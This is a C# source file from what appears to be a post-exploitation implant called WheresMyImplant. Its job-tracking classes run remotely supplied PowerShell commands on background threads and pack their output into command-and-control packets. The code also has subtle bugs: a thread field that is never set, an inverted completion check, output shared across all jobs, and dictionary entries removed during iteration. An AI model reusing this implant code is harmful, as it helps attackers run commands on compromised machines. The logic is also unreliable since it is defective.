using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Threading;

namespace WheresMyImplant
{
    ////////////////////////////////////////////////////////////////////////////////
    public class JobTracking
    {
        public Dictionary<String, Job> jobs;
        public Byte[] importedScript { get; set; }

        ////////////////////////////////////////////////////////////////////////////////
        public JobTracking()
        {
            jobs = new Dictionary<String, Job>();
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal void checkAgentJobs(ref byte[] packets, ref Coms coms)
        {
            foreach (KeyValuePair<string, Job> job in jobs)
            {
                if (job.Value.isCompleted())
                {
                    //Add to packet
                    jobs.Remove(job.Key);
                    //Add the correct result id
                    packets = Misc.combine(packets, coms.encodePacket(110, job.Value.getOutput(), 0));
                }
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal byte[] getAgentJobsOutput(ref Coms coms)
        {
            byte[] jobResults = new byte[0];
            foreach (String jobName in jobs.Keys)
            {
                String results = "";
                if (jobs[jobName].isCompleted())
                {
                    results = jobs[jobName].getOutput();
                    jobs[jobName].killThread();
                    jobs.Remove(jobName);
                }
                else
                {
                    results = jobs[jobName].getOutput();
                }

                if (results.Length > 0)
                {
                    jobResults = Misc.combine(jobResults, coms.encodePacket(110, results, 0));
                }
            }
            return jobResults;
        }

        ////////////////////////////////////////////////////////////////////////////////
        internal String startAgentJob(string command)
        {
            Random random = new Random();
            string characters = "ABCDEFGHKLMNPRSTUVWXYZ123456789";
            char[] charactersArray = characters.ToCharArray();
            string id = "";
            for (Int32 i = 0; i < 8; i++)
            {
                Int32 j = random.Next(charactersArray.Length);
                id += charactersArray[j];
            }
            jobs.Add(id, new Job(command));
            return id;
        }
    }

    ////////////////////////////////////////////////////////////////////////////////
    public class Job
    {
        private Thread thread {get; set;}
        private String command { get; set;}
        private static String output = "";

        ////////////////////////////////////////////////////////////////////////////////
        public Job(String command)
        {
            this.command = command;
            Thread thread = new Thread(() => runPowerShell(command));
            thread.Start();
        }

        ////////////////////////////////////////////////////////////////////////////////
        public static void runPowerShell(String command)
        {
            Runspace runspace = RunspaceFactory.CreateRunspace();
            runspace.Open();
            RunspaceInvoke scriptInvoker = new RunspaceInvoke(runspace);

            Pipeline pipeline = runspace.CreatePipeline();
            pipeline.Commands.AddScript(command);
            pipeline.Commands.Add("Out-String");

            try
            {
                Collection<PSObject> results = pipeline.Invoke();
                foreach (PSObject obj in results)
                {
                    output += obj.ToString();
                }
            }
            catch (CmdletInvocationException error)
            {
                output += error;
            }
            finally
            {
                runspace.Close();
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        public Boolean isCompleted()
        {
            if (thread != null)
            {
                return thread.IsAlive;
            }
            else
            {
                return false;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        public String getOutput()
        {
            return output;
        }

        ////////////////////////////////////////////////////////////////////////////////
        public void killThread()
        {
            thread.Abort();
        }
    }
}